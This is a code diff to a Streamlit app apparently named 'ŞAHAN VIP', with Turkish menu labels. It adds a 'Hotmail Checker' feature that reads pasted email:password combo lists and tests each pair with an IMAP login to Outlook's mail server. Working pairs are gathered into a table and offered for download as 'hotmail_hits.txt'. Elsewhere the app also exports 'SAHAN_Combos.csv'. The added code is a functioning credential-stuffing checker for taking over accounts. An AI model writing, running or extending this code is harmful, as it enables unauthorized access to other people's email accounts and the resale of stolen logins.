@@ -1,5 +1,6 @@
 import csv
 from datetime import datetime
+import imaplib
 import json
 import re
 import requests
@@ -131,7 +132,12 @@ st.sidebar.markdown(
 )
 
 menu = st.sidebar.radio(
-    "Menü", ["⚡ Tekli URL Taraması", "🔍 Raw API Konsolu"]
+    "Menü",
+    [
+        "⚡ Tekli URL Taraması",
+        "✉️ Hotmail Checker",
+        "🔍 Raw API Konsolu",
+    ],
 )
 
 st.sidebar.markdown("---")
@@ -216,6 +222,62 @@ if menu == "⚡ Tekli URL Taraması":
           csv_data,
           file_name="SAHAN_Combos.csv",
           mime="text/csv",
+      )
+
+elif menu == "✉️ Hotmail Checker":
+  st.markdown("## ŞAHAN VIP - Hotmail / Outlook Checker")
+  st.markdown(
+      "Her satıra bir adet **email:sifre** formatında hesap yazın:"
+  )
+
+  combo_input = st.text_area(
+      "Hotmail Listesi",
+      placeholder="ornek@hotmail.com:sifre123\ntest@outlook.com:sifre456",
+      height=200,
+  )
+
+  if st.button("🔍 Hotmail Hesaplarını Kontrol Et", use_container_width=True):
+    lines = combo_input.strip().split("\n")
+    valid_accounts = []
+    invalid_count = 0
+
+    progress_bar = st.progress(0)
+    status_text = st.empty()
+
+    total = len(lines)
+    for i, line in enumerate(lines):
+      if ":" in line:
+        parts = line.split(":", 1)
+        email = parts[0].strip()
+        password = parts[1].strip()
+
+        status_text.text(f"Kontrol ediliyor: {email}")
+        try:
+          mail = imaplib.IMAP4_SSL("imap-mail.outlook.com", 993)
+          mail.login(email, password)
+          mail.logout()
+          valid_accounts.append((email, password))
+        except:
+          invalid_count += 1
+
+      if total > 0:
+        progress_bar.progress((i + 1) / total)
+
+    status_text.text("Kontrol tamamlandı!")
+    st.success(f"✅ Çalışan Hesap Sayısı: {len(valid_accounts)}")
+
+    if valid_accounts:
+      import pandas as pd
+
+      df_val = pd.DataFrame(valid_accounts, columns=["Email", "Şifre"])
+      st.dataframe(df_val, use_container_width=True)
+
+      hit_text = "\n".join([f"{e}:{p}" for e, p in valid_accounts])
+      st.download_button(
+          "📋 Çalışanları İndir (TXT)",
+          hit_text,
+          file_name="hotmail_hits.txt",
+          mime="text/plain",
       )
 
 elif menu == "🔍 Raw API Konsolu":
